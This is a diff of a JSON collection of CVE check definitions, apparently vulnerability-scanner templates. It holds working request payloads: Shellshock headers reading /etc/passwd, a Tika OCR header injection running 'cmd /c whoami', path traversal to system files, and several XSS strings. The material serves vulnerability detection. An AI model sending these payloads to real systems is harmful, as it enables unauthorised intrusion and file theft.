@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6357,11 +6357,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -8241,6 +8241,22 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/share/page/dologin"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-14251",
+      "info": {
+        "name": "T24 in TEMENOS Channels R15.01 - Pre Authenticated Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/WealthT24/GetImage?docDownloadPath=/etc/passwd",
+            "{{BaseURL}}/WealthT24/GetImage?docDownloadPath=c:/windows/win.ini"
           ]
         }
       ]
@@ -10815,7 +10831,6 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/php/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
             "{{BaseURL}}/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
@@ -11292,9 +11307,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -14503,6 +14518,21 @@
           "raw": [
             "GET /misc.php?action=showpopups&type=friend HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\n",
             "GET /include/findusers.php?token={{token}} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-26702",
+      "info": {
+        "name": "EPrints 3.4.2 XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi/dataset_dictionary?dataset=zulu</title></script><script>alert(document.domain)</script>"
           ]
         }
       ]
@@ -18363,6 +18393,20 @@
       ]
     },
     {
+      "id": "CVE-2022-24181",
+      "info": {
+        "name": "PKP Open Journals System 3.3 - Cross-Site Scripting (XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /iupjournals/index.php/esj HTTP/2\nHost: {{Hostname}}\nX-Forwarded-Host: foo\"><script>alert(document.domain)</script><x=\".com\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-24260",
       "info": {
         "name": "VoipMonitor - Pre-Auth SQL Injection",
@@ -18742,6 +18786,21 @@
       ]
     },
     {
+      "id": "CVE-2022-29298",
+      "info": {
+        "name": "SolarView Compact 6.00 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-29299",
       "info": {
         "name": "SolarView Compact 6.00 - 'time_begin' Cross-Site Scripting",
@@ -18916,6 +18975,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/resources//../WEB-INF/web.xml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31373",
+      "info": {
+        "name": "SolarView Compact 6.00 - Cross-Site Scripting(XSS)",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Solar_AiConf.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
